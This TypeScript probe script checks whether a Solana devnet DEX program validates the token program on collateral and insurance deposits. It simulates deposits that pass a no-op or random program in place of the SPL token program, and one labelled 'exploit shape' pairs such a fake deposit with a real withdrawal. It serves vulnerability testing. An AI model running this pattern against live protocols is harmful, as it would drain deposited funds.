/**
 * Probe: does percolator-lean (e1e4404, devnet) validate the token program on deposit?
 * Creates one fresh portfolio on an existing smoke DEX (real tx), then SIMULATES
 * DepositCollateral / DepositInsurance with tokenProgram = SPL Noop. Nothing that
 * would credit capital is ever sent. Devnet only.
 */
import { Connection, Keypair, PublicKey, SystemProgram, Transaction, sendAndConfirmTransaction } from "@solana/web3.js";
import * as fs from "fs";
import {
  LEAN_DEVNET, PORTFOLIO_SIZE, INS_RECEIPT_SIZE, assertDevnet, parseDex, discoverMarkets,
  initPortfolio, depositCollateral, depositInsurance, withdrawCollateral, leanErrorName, TOKEN_PROGRAM_ID,
} from "../src/lean/index.js";

const RPC = process.env.SOLANA_RPC_URL ?? "https://api.devnet.solana.com";
const conn = new Connection(RPC, "confirmed");
const P = LEAN_DEVNET.percolator;
const NOOP = new PublicKey("noopb9bkMVfRPU8AsbpTUg8AQkHtKwMYZiFUjNRtMmV");
const DEX = new PublicKey(process.env.DEX ?? "7iu9Yga379XqZ6s4buzh2cZmbc9examJF75NdzgPKzM3");
const funder = Keypair.fromSecretKey(Uint8Array.from(JSON.parse(fs.readFileSync(`${process.env.HOME}/.config/solana/id.json`, "utf8"))));

async function sim(label: string, ixs: any[], signers: Keypair[]) {
  const tx = new Transaction().add(...ixs);
  tx.feePayer = funder.publicKey;
  tx.recentBlockhash = (await conn.getLatestBlockhash("confirmed")).blockhash;
  tx.sign(funder, ...signers);
  const r = (await conn.simulateTransaction(tx)).value;
  const e = r.err as any;
  const c = e?.InstructionError?.[1]?.Custom;
  console.log(`${label}: ${e ? (c !== undefined ? `REJECTED ${leanErrorName(c)} (${c})` : `REJECTED ${JSON.stringify(e)}`) : "*** SUCCEEDED ***"}  CU=${r.unitsConsumed}`);
  for (const l of (r.logs ?? []).filter((l) => /invoke|failed|success/.test(l))) console.log(`    ${l}`);
  return e;
}

async function main() {
  await assertDevnet(conn);
  const dex = parseDex(Buffer.from((await conn.getAccountInfo(DEX))!.data));
  const V = { dex: DEX, mint: dex.quoteMint, vault: dex.vault };
  const owner = Keypair.generate();
  const pfl = Keypair.generate();
  const lamports = await conn.getMinimumBalanceForRentExemption(PORTFOLIO_SIZE);
  await sendAndConfirmTransaction(conn, new Transaction().add(
    SystemProgram.createAccount({ fromPubkey: funder.publicKey, newAccountPubkey: pfl.publicKey, lamports, space: PORTFOLIO_SIZE, programId: P }),
    initPortfolio(P, { dex: DEX, portfolio: pfl.publicKey, owner: owner.publicKey }),
  ), [funder, pfl, owner], { commitment: "confirmed" });
  console.log(`fresh portfolio ${pfl.publicKey.toBase58()} on dex ${DEX.toBase58()} (capital 0, no token account at all)`);

  const fakeSrc = Keypair.generate().publicKey; // not even a token account
  const amt = 1_000_000_000n; // 1000 quote units
  await sim("DepositCollateral tokenProgram=Noop", [depositCollateral(P, { ...V, tokenProgram: NOOP }, { portfolio: pfl.publicKey, depositor: owner.publicKey, sourceToken: fakeSrc, amount: amt })], [owner]);
  await sim("DepositCollateral tokenProgram=random", [depositCollateral(P, { ...V, tokenProgram: Keypair.generate().publicKey }, { portfolio: pfl.publicKey, depositor: owner.publicKey, sourceToken: fakeSrc, amount: amt })], [owner]);
  await sim("DepositCollateral tokenProgram=SPL (control, fake source)", [depositCollateral(P, { ...V, tokenProgram: TOKEN_PROGRAM_ID }, { portfolio: pfl.publicKey, depositor: owner.publicKey, sourceToken: fakeSrc, amount: amt })], [owner]);
  // the full exploit shape, simulated atomically: fake deposit then real withdraw
  await sim("Noop deposit + real Withdraw (exploit shape)", [
    depositCollateral(P, { ...V, tokenProgram: NOOP }, { portfolio: pfl.publicKey, depositor: owner.publicKey, sourceToken: fakeSrc, amount: amt }),
    withdrawCollateral(P, V, { portfolio: pfl.publicKey, owner: owner.publicKey, destToken: fakeSrc, amount: 1n }),
  ], [owner]);

  const mkts = await discoverMarkets(conn, P, { dex: DEX });
  if (mkts.length) {
    const rc = Keypair.generate();
    const rl = await conn.getMinimumBalanceForRentExemption(INS_RECEIPT_SIZE);
    await sim("DepositInsurance tokenProgram=Noop", [
      SystemProgram.createAccount({ fromPubkey: funder.publicKey, newAccountPubkey: rc.publicKey, lamports: rl, space: INS_RECEIPT_SIZE, programId: P }),
      depositInsurance(P, { ...V, tokenProgram: NOOP }, { market: mkts[0].address, receipt: rc.publicKey, lp: owner.publicKey, sourceToken: fakeSrc, amount: amt }),
    ], [rc, owner]);
  }
  process.exit(0);
}
main().catch((e) => { console.error(e); process.exit(1); });
